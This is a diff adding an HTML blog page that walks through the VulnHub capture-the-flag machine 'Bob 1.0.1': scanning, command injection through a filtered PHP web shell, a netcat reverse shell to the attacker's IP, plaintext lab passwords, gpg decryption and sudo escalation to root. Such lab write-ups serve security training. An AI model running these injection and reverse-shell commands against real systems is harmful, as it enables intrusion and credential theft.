@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Bob 1.0.1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Bob 1.0.1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian." />
+<meta property="og:description" content="Description: The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian." />
+<link rel="canonical" href="http://localhost:4000/bob1.html" />
+<meta property="og:url" content="http://localhost:4000/bob1.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/bob1.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-03T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/bob1.html" />
+<meta property="twitter:title" content="VulnHub - Bob 1.0.1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Bob 1.0.1","dateModified":"2021-10-03T00:00:00-05:00","datePublished":"2021-10-03T00:00:00-05:00","url":"http://localhost:4000/bob1.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/bob1.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Bob 1.0.1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>October 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running Debian.</p>
+
+<p><strong>Author:</strong> c0rruptedb1t</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get the flag in /.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>I proceeded to detect the target host on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24          
+ Currently scanning: Finished!   |   Screen View: Unique Hosts           
+                                                                  
+ 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222        
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.153 00:0c:29:0e:b0:d2      3     180  VMware, Inc.         
+ 192.168.179.254 00:50:56:e0:d4:3f      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>I did a full TCP port scan with nmap to discover available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-T5</span> 192.168.179.153 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT      STATE SERVICE
+80/tcp    open  http
+25468/tcp open  unknown
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Then I discovered the version of the services, OS detection , script scanning and traceroute on the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p80</span>,25468 192.168.179.153 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE VERSION                                      
+80/tcp    open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>           
+| http-methods:                                                          
+|_  Supported Methods: OPTIONS HEAD GET POST                       
+| http-robots.txt: 4 disallowed entries 
+| /login.php /dev_shell.php /lat_memo.html 
+|_/passwords.html
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
+|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
+|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Interacting with the web service I discovered a web site under construction.</p>
+
+<p><img src="/assets/images/bob1/screenshot-1.png" alt="" /></p>
+
+<p>If we notice in the nmap scan the robots.txt file was found which contains some web files especially one called <strong>dev_shell.php</strong> that looks interesting.</p>
+
+<p><img src="/assets/images/bob1/screenshot-2.png" alt="" /></p>
+
+<p>As we see this allows us executing some system commands but the cat command is not allowed, whit the following command I listed the sorce code of the dev_shell.php file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more dev_shell.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/bob1/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/bob1/screenshot-4.png" alt="" /></p>
+
+<p>Analyzing the source code we see an array of commands not allowed, then the strpos() function returns a message if exists a semicolon in the string, if not the explode() function breaks the string into an array, then into the if statement checks only the first position of the array for bad commands, these restrictions allow the attacker execute system commands.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="command-injection">Command Injection</h3>
+
+<p>First we need set up a netcat listener, then execute the following netcat command to get a reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span><span class="o">&amp;&amp;</span>nc 192.168.179.1 443 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+<p><img src="/assets/images/bob1/screenshot-5.png" alt="" /></p>
+
+<p>Then I update it for a full TTY shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.153] 32884
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+script <span class="nt">-qc</span> /bin/bash /dev/null
+www-data@Milburg-High:/var/www/html<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-vlnp</span> 443
+root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443
+
+www-data@Milburg-High:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+www-data@Milburg-High:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+www-data@Milburg-High:/var/www/html<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 164
+</code></pre></div></div>
+
+<p>In elliot’s home directory I found a file with contains his password <strong>theadminisdumb</strong> and that of james <strong>Qwerty</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/elliot<span class="nv">$ </span><span class="nb">cat </span>theadminisdumb.txt 
+The admin is dumb,
+In fact everyone <span class="k">in </span>the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them <span class="k">for </span>that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone <span class="k">else in </span>the dept, he always yells at Sebastian and James now they <span class="k">do </span>some dumb stuff but their new and this is just a high-school server <span class="nb">who </span>cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why <span class="k">do </span>we need custom wallpapers that doesn’t <span class="k">do </span>anything. I have been suggesting <span class="nb">time </span>and <span class="nb">time </span>again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same <span class="k">for </span>his friend James <span class="nb">who </span>doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of <span class="nb">time </span>before it’s broken into so because of this I have changed my password to
+
+theadminisdumb
+
+I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same <span class="nb">time </span>it doesn’t affect me <span class="k">if </span>they get breached, I get paid, he gets fired it’s a good time.
+</code></pre></div></div>
+
+<p>In bob’s home directory, in hidden file, I found the password for users jc and seb.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob<span class="nv">$ </span><span class="nb">cat</span> .old_passwordfile.html 
+
+&lt;html&gt;
+&lt;p&gt;
+jc:Qwerty
+seb:T1tanium_Pa<span class="nv">$$</span>word_Hack3rs_Fear_M3
+&lt;/p&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>In bob’s Documents directory I found three resources.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob/Documents<span class="nv">$ </span><span class="nb">ls
+</span>Secret  login.txt.gpg  staff.txt
+</code></pre></div></div>
+
+<p>Then I Transfer the login.txt.gpg file to the attacking machine which looks interesting.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob/Documents<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 8080 &lt; login.txt.gpg 
+listening on <span class="o">[</span>any] 8080 ...
+connect to <span class="o">[</span>192.168.179.153] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.1] 59366
+
+
+root@kali:~<span class="nv">$ </span>nc 192.168.179.153 8080 <span class="o">&gt;</span> login.txt.gpg
+</code></pre></div></div>
+
+<p>Inside the secret directory I found a script with notes, as we can see, the first letters vertically say <strong>HARPOCRATES</strong>, this looks like a potential password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob/Documents<span class="nv">$ </span><span class="nb">cat </span>Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh 
+<span class="c">#!/bin/bash</span>
+clear
+<span class="nb">echo</span> <span class="s2">"-= Notes =-"</span>
+<span class="nb">echo</span> <span class="s2">"Harry Potter is my faviorite"</span>
+<span class="nb">echo</span> <span class="s2">"Are you the real me?"</span>
+<span class="nb">echo</span> <span class="s2">"Right, I'm ordering pizza this is going nowhere"</span>
+<span class="nb">echo</span> <span class="s2">"People just don't get me"</span>
+<span class="nb">echo</span> <span class="s2">"Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;"</span>
+<span class="nb">echo</span> <span class="s2">"Cucumber"</span>
+<span class="nb">echo</span> <span class="s2">"Rest now your eyes are sleepy"</span>
+<span class="nb">echo</span> <span class="s2">"Are you gonna stop reading this yet?"</span>
+<span class="nb">echo</span> <span class="s2">"Time to fix the server"</span>
+<span class="nb">echo</span> <span class="s2">"Everyone is annoying"</span>
+<span class="nb">echo</span> <span class="s2">"Sticky notes gotta buy em"</span>
+</code></pre></div></div>
+
+<p>Then I decrypted the login.txt.gpg file with the password: <strong>HARPOCRATES</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gpg <span class="nt">--passphrase</span> HARPOCRATES <span class="nt">--decrypt</span> login.txt.gpg
+gpg: AES encrypted data
+gpg: encrypted with 1 passphrase
+bob:b0bcat_
+</code></pre></div></div>
+
+<p>Now we have the bob’s password, I switch to the user Bob, this belongs to the sudoers group so he’s allowed to execute any command as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@Milburg-High:~/Documents<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>
+bob@Milburg-High:~/Documents<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: unable to resolve host Milburg-High: Connection timed out
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>bob: 
+Matching Defaults entries <span class="k">for </span>bob on Milburg-High:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User bob may run the following commands on Milburg-High:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>To get root we simply execute the su command as sudo, to read the flag the cat binary isn’t working, so I used the more command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@Milburg-High:~/Documents<span class="nv">$ </span><span class="nb">sudo </span>su -
+<span class="nb">sudo</span>: unable to resolve host Milburg-High: Connection timed out
+root@Milburg-High:~# <span class="nb">whoami
+</span>root
+root@Milburg-High:~# <span class="nb">cat</span> /flag.txt 
+hey n there /flag.txt
+root@Milburg-High:~# more /flag.txt 
+CONGRATS ON GAINING ROOT
+
+        .-.
+       <span class="o">(</span>   <span class="o">)</span>
+        |~|       _.--._
+        |~|~:<span class="s1">'--~'</span>      |
+        | | :   <span class="c">#root   |</span>
+        | | :     _.--._|
+        |~|~<span class="sb">`</span><span class="s1">'--~'</span>
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+        | |
+   _____|_|_________ Thanks <span class="k">for </span>playing ~c0rruptedb1t
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
